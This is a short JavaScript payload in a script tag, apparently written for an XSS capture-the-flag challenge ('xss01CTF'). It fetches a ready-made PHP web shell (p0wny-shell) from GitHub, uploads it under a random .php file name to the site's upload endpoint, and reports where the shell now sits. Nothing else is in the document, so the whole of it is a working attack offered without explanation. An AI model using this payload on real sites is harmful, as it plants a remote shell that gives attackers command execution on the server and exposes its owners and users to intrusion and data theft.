<script>
(function () {

  function randomName(len = 5) {
    return 'file_' + Math.random().toString(36).substr(2, len) + '.php';
  }

  const filename = randomName();

  fetch('https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php')
    .then(r => r.text())
    .then(code => {
      const form = new FormData();
      form.append(
        'file',
        new Blob([code], { type: 'application/x-php' }),
        filename
      );
      return fetch('/xss01CTF/upload.php', {
        method: 'POST',
        body: form
      });
    })
    .then(() => {
      alert('Shell uploaded: /xss01CTF/upload/' + filename);
    });

})();
</script>
